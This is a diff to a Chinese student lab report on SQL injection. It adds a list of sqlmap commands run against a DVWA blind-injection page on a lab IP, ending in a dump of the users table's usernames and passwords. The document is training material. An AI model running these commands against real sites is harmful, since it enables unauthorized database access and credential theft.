@@ -9,6 +9,7 @@ categories:
   - 实验报告
 date: 2024-07-13 08:06:00
 cover: https://img-blog.csdnimg.cn/6a525f6f18c64ca788535b07bd3b86ec.png#pic_center
+
 ---
 
 # 网络安全实训 6——SQL 注入
@@ -110,3 +111,20 @@ cover: https://img-blog.csdnimg.cn/6a525f6f18c64ca788535b07bd3b86ec.png#pic_cent
 重试了一下正常了
 
 ![image-20240713090344216](../img/zuolao/6/image-20240713090344216.png)
+
+## 过程中的命令
+
+- python sqlmap.py -u "http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id = 1&Submit = Submit#" --cookie = "security = low; PHPSESSID = 59mb9spqvkd9cuk543thagtsd5" --batch
+
+- python sqlmap.py -u "http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id = 1&Submit = Submit#" --cookie = "security = low; PHPSESSID = 59mb9spqvkd9cuk543thagtsd5" --batch --dbs
+
+- python sqlmap.py -u "http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id = 1&Submit = Submit#" --cookie = "security = low; PHPSESSID = 59mb9spqvkd9cuk543thagtsd5" --batch --current-db
+
+- python sqlmap.py -u "http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id = 1&Submit = Submit#" --cookie = "security = low; PHPSESSID = 59mb9spqvkd9cuk543thagtsd5" --batch -D dvwa --tables
+
+- python sqlmap.py -u "http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id = 1&Submit = Submit#" --cookie = "security = low; PHPSESSID = 59mb9spqvkd9cuk543thagtsd5" --batch -D dvwa --tables
+
+- python sqlmap.py -u "http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id = 1&Submit = Submit#" --cookie = "security = low; PHPSESSID = 59mb9spqvkd9cuk543thagtsd5" --batch -D dvwa -T users --columns
+
+- python sqlmap.py -u "http://192.168.189.134/dvwa/vulnerabilities/sqli_blind/?id = 1&Submit = Submit#" --cookie = "security = low; PHPSESSID = 59mb9spqvkd9cuk543thagtsd5" --batch -D dvwa -T users -C "user, password" --dump
+
